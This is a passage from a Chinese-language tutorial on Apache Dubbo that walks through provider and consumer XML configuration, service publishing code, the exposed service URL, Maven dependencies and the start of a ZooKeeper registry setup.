<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:dubbo</span>=<span class="string">&quot;http://code.alibabatech.com/schema/dubbo&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans        http://www.springframework.org/schema/beans/spring-beans.xsd        http://code.alibabatech.com/schema/dubbo        http://code.alibabatech.com/schema/dubbo/dubbo.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--当前项目在整个分布式架构里面的唯一名称，计算依赖关系的标签--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:application</span> <span class="attr">name</span>=<span class="string">&quot;provider&quot;</span> <span class="attr">owner</span>=<span class="string">&quot;sihai&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dubbo:parameter</span> <span class="attr">key</span>=<span class="string">&quot;qos.enable&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dubbo:parameter</span> <span class="attr">key</span>=<span class="string">&quot;qos.accept.foreign.ip&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dubbo:parameter</span> <span class="attr">key</span>=<span class="string">&quot;qos.port&quot;</span> <span class="attr">value</span>=<span class="string">&quot;55555&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dubbo:application</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:monitor</span> <span class="attr">protocol</span>=<span class="string">&quot;registry&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--dubbo这个服务所要暴露的服务地址所对应的注册中心--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;dubbo:registry address=&quot;N/A&quot;/&gt;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">address</span>=<span class="string">&quot;N/A&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--当前服务发布所依赖的协议；webservice、Thrift、Hessain、http--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">name</span>=<span class="string">&quot;dubbo&quot;</span> <span class="attr">port</span>=<span class="string">&quot;20880&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--服务发布的配置，需要暴露的服务接口--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:service</span></span></span><br><span class="line"><span class="tag">            <span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">ref</span>=<span class="string">&quot;providerService&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--Bean bean定义--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;providerService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderServiceImpl&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>说明：</p>
<p>1、上面的文件其实就是类似  <code>spring</code>  的配置文件，而且， <code>dubbo</code>  底层就是  <code>spring</code> 。<br>
2、节点： <code>dubbo:application</code> <br>
 就是整个项目在分布式架构中的唯一名称，可以在 <code>name</code>  属性中配置，另外还可以配置 <code>owner</code>  字段，表示属于谁。<br>
下面的参数是可以不配置的，这里配置是因为出现了端口的冲突，所以配置。<br>
3、节点： <code>dubbo:monitor</code> <br>
 监控中心配置， 用于配置连接监控中心相关信息，可以不配置，不是必须的参数。<br>
4、节点： <code>dubbo:registry</code> <br>
 配置注册中心的信息，比如，这里我们可以配置  <code>zookeeper</code>  作为我们的注册中心。 <code>address</code>  是注册中心的地址，这里我们配置的是  <code>N/A</code>  表示由  <code>dubbo</code>  自动分配地址。或者说是一种直连的方式，不通过注册中心。<br>
5、节点： <code>dubbo:protocol</code> <br>
 服务发布的时候  <code>dubbo</code>  依赖什么协议，可以配置 <code>dubbo</code> 、 <code>webservice</code> 、 <code>http</code>  等协议。<br>
6、节点： <code>dubbo:service</code> <br>
 这个节点就是我们的重点了，当我们服务发布的时候，我们就是通过这个配置将我们的服务发布出去的。 <code>interface</code>  是接口的包路径， <code>ref</code>  是第 ⑦ 点配置的接口的 <code>bean</code> 。<br>
7、最后，我们需要像配置 <code>spring</code>  的接口一样，配置接口的  <code>bean</code> 。</p>
<p>到这一步，关于服务端的配置就完成了，下面我们通过  <code>main</code>  方法将接口发布出去。</p>
<p><strong>发布接口</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sihai.dubbo.provider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.ApplicationConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.ProtocolConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.RegistryConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.ServiceConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.container.Main;</span><br><span class="line"><span class="keyword">import</span> com.sihai.dubbo.provider.service.ProviderService;</span><br><span class="line"><span class="keyword">import</span> com.sihai.dubbo.provider.service.ProviderServiceImpl;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * xml方式启动</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//加载xml配置文件启动</span></span><br><span class="line">        <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;META-INF/spring/provider.xml&quot;</span>);</span><br><span class="line">        context.start();</span><br><span class="line">        System.in.read(); <span class="comment">// 按任意键退出</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发布接口非常简单，因为 <code>dubbo</code>  底层就是依赖  <code>spring</code>  的，所以，我们只需要通过  <code>ClassPathXmlApplicationContext</code>  拿到我们刚刚配置好的  <code>xml</code> ，然后调用  <code>context.start()</code>  方法就启动了。</p>
<p>看到下面的截图，就算是启动成功了，接口也就发布出去了。</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/fb50e61a90ab4e6c873323a7bac4d345.png" alt="在这里插入图片描述"><br>
你以为到这里就结束了了，并不是的，我们拿到  <code>dubbo</code>  暴露出去的  <code>url</code>  分析分析。</p>
<p><strong>Dubbo 暴露的 URL</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dubbo://192.168.234.1:20880/com.sihai.dubbo.provider.service.ProviderService?anyhost=true&amp;application=provider&amp;bean.name=com.sihai.dubbo.provider.service.ProviderService&amp;bind.ip=192.168.234.1&amp;bind.port=20880&amp;dubbo=2.0.2&amp;generic=false&amp;interface=com.sihai.dubbo.provider.service.ProviderService&amp;methods=SayHello&amp;owner=sihai&amp;pid=8412&amp;qos.accept.foreign.ip=false&amp;qos.enable=true&amp;qos.port=55555&amp;side=provider&amp;timestamp=1562077289380</span><br></pre></td></tr></table></figure>
<p>分析如下：</p>
<p>1、首先，在形式上我们发现，其实这么牛逼的  <code>dubbo</code>  也是用类似于  <code>http</code>  的协议发布自己的服务的，只是这里我们用的是 <code>dubbo</code>  协议。<br>
2、 <code>dubbo://192.168.234.1:20880/com.sihai.dubbo.provider.service.ProviderService</code> <br>
 上面这段链接就是  <code>?</code>  之前的链接，构成：<strong>协议://ip: 端口 / 接口</strong>。发现是不是也没有什么神秘的。<br>
3、 <code>anyhost=true&amp;application=provider&amp;bean.name=com.sihai.dubbo.provider.service.ProviderService&amp;bind.ip=192.168.234.1&amp;bind.port=20880&amp;dubbo=2.0.2&amp;generic=false&amp;interface=com.sihai.dubbo.provider.service.ProviderService&amp;methods=SayHello&amp;owner=sihai&amp;pid=8412&amp;qos.accept.foreign.ip=false&amp;qos.enable=true&amp;qos.port=55555&amp;side=provider&amp;timestamp=1562077289380</code> <br>
 <code>?</code>  之后的字符串，分析后你发现，这些都是刚刚在 <code>provider.xml</code>  中配置的字段，然后通过 <code>&amp;</code>  拼接而成的，闻到了  <code>http</code>  的香味了吗？</p>
<p>终于， <code>dubbo</code>  服务端入门了。下面我们看看拿到了  <code>url</code>  后，怎么消费呢？</p>
<h3 id="162-消费端"><a class="markdownIt-Anchor" href="#162-消费端">#</a> 1.6.2 消费端</h3>
<p>上面提到，我们在服务端提供的只是点对点的方式提供服务，并没有使用注册中心，所以，下面的配置也是会有一些不一样的。</p>
<p><strong>消费端环境配置</strong><br>
首先，我们在消费端的  <code>resource</code>  下建立配置文件  <code>consumer.xml</code></p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/e6964bf9a44b442ca792e91ca7e098b0.png" alt="在这里插入图片描述"></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:dubbo</span>=<span class="string">&quot;http://code.alibabatech.com/schema/dubbo&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans        http://www.springframework.org/schema/beans/spring-beans.xsd        http://code.alibabatech.com/schema/dubbo        http://code.alibabatech.com/schema/dubbo/dubbo.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--当前项目在整个分布式架构里面的唯一名称，计算依赖关系的标签--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:application</span> <span class="attr">name</span>=<span class="string">&quot;consumer&quot;</span> <span class="attr">owner</span>=<span class="string">&quot;sihai&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--dubbo这个服务所要暴露的服务地址所对应的注册中心--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--点对点的方式--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">address</span>=<span class="string">&quot;N/A&quot;</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;dubbo:registry address=&quot;zookeeper://localhost:2181&quot; check=&quot;false&quot;/&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--生成一个远程服务的调用代理--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--点对点方式--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:reference</span> <span class="attr">id</span>=<span class="string">&quot;providerService&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">url</span>=<span class="string">&quot;dubbo://192.168.234.1:20880/com.sihai.dubbo.provider.service.ProviderService&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--&lt;dubbo:reference id=&quot;providerService&quot;  </span></span><br><span class="line"><span class="comment">                    interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>分析如下所示：</p>
<p>1、发现这里的  <code>dubbo:application</code>  和  <code>dubbo:registry</code>  是一致的<br>
 2、 <code>dubbo:reference</code>  ：我们这里采用点对点的方式，所以，需要配置在服务端暴露的  <code>url</code></p>
<p><strong>maven 依赖</strong><br>
和服务端一样</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.ouyangsihai<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo-consumer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.ouyangsihai<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo-provider<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/dubbo --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.101tec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zkclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.netty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>netty-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.32.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.curator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>curator-framework<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.curator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>curator-recipes<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>调用服务</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sihai.dubbo.consumer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.ApplicationConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.ReferenceConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.RegistryConfig;</span><br><span class="line"><span class="keyword">import</span> com.sihai.dubbo.provider.service.ProviderService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * xml的方式调用</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        ClassPathXmlApplicationContext context=<span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;consumer.xml&quot;</span>);</span><br><span class="line">        context.start();</span><br><span class="line">        <span class="type">ProviderService</span> <span class="variable">providerService</span> <span class="operator">=</span> (ProviderService) context.getBean(<span class="string">&quot;providerService&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> providerService.SayHello(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        System.in.read();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里和服务端的发布如出一辙<br>
<img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/af173265c9fd4e72a6118916e5f4bf32.png" alt="在这里插入图片描述"><br>
如此，我们就成功调用接口了。</p>
<h2 id="17-加入zookeeper作为注册中心"><a class="markdownIt-Anchor" href="#17-加入zookeeper作为注册中心">#</a> 1.7 加入 <code>zookeeper</code>  作为注册中心</h2>
<p>在前面的案例中，我们没有使用任何的注册中心，而是用一种直连的方式进行的。但是，实际上很多时候，我们都是使用 <code>dubbo + zookeeper</code>  的方式，使用  <code>zookeeper</code>  作为注册中心，这里，我们就介绍一下  <code>zookeeper</code>  作为注册中心的使用方法。</p>
<p>这里，我们在前面的入门实例中进行改造。</p>
<h3 id="171-服务端"><a class="markdownIt-Anchor" href="#171-服务端">#</a> 1.7.1 服务端</h3>
<p>在服务端中，我们只需要修改 <code>provider.xml</code>  即可。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:dubbo</span>=<span class="string">&quot;http://code.alibabatech.com/schema/dubbo&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans        http://www.springframework.org/schema/beans/spring-beans.xsd        http://code.alibabatech.com/schema/dubbo        http://code.alibabatech.com/schema/dubbo/dubbo.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--当前项目在整个分布式架构里面的唯一名称，计算依赖关系的标签--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:application</span> <span class="attr">name</span>=<span class="string">&quot;provider&quot;</span> <span class="attr">owner</span>=<span class="string">&quot;sihai&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dubbo:parameter</span> <span class="attr">key</span>=<span class="string">&quot;qos.enable&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dubbo:parameter</span> <span class="attr">key</span>=<span class="string">&quot;qos.accept.foreign.ip&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dubbo:parameter</span> <span class="attr">key</span>=<span class="string">&quot;qos.port&quot;</span> <span class="attr">value</span>=<span class="string">&quot;55555&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dubbo:application</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:monitor</span> <span 